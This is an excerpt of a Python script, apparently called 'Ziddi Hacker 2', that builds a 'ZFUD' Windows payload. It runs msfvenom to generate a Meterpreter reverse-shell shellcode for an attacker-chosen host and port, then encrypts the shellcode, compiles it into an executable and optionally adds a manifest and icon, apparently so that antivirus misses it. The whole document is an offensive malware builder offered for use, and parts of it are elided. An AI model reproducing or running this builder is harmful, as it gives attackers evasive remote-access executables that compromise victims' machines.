...
|__  (_) __| | __| (_) | | | | __ _  ___| | _____ _ __  |___ \ 
  / /| |/ _` |/ _` | | | |_| |/ _` |/ __| |/ / _ \ '__|   __) |
 / /_| | (_| | (_| | | |  _  | (_| | (__|   <  __/ |     / __/ 
/____|_|\__,_|\__,_|_| |_| |_|\__,_|\___|_|\_\___|_|    |_____|


{colour_codes['RESET_ALL']}''')

	payload_type = input(print_query("What ZFUD payload you need [tcp--https--http--ipv6_tcp]: "))
	...
	raw_payload = (f"msfvenom -p windows/x64/meterpreter_reverse_{payload_type} LHOST={lhost} LPORT={lport} EXITFUNC=process --platform windows -a x64 -f raw -o ./result/ZFUD.raw")
	...
	try:
		shellcode_output = "./result/ZFUD.raw"
	...
	source_file = f"./result/ZFUD_{lport}.c"
	writetofile(transformed_shellcode, master_key, source_file)

	# Compiling
	exe_name = f"./result/ZFUD_{lport}"
	...
	if generate_manifest == "y":
		...
		os.system(manifest)
		print(print_success(f"ZFUD File with Manifest [{exe_name}.exe]"))
	else:
		print(print_success(f"ZFUD File [{exe_name}.exe]"))
	...
	if generate_icon == "y":
		...
		os.system(icon)
		print(print_success(f"ZFUD File with icon [{exe_name}.exe]"))
	else:
		print(print_success(f"ZFUD File [{exe_name}.exe]"))
	print("\n")
	
	print(print_status("Ziddi Hacker 2\n"))
	print(print_success("Happy Hacking ZFUD\n"))
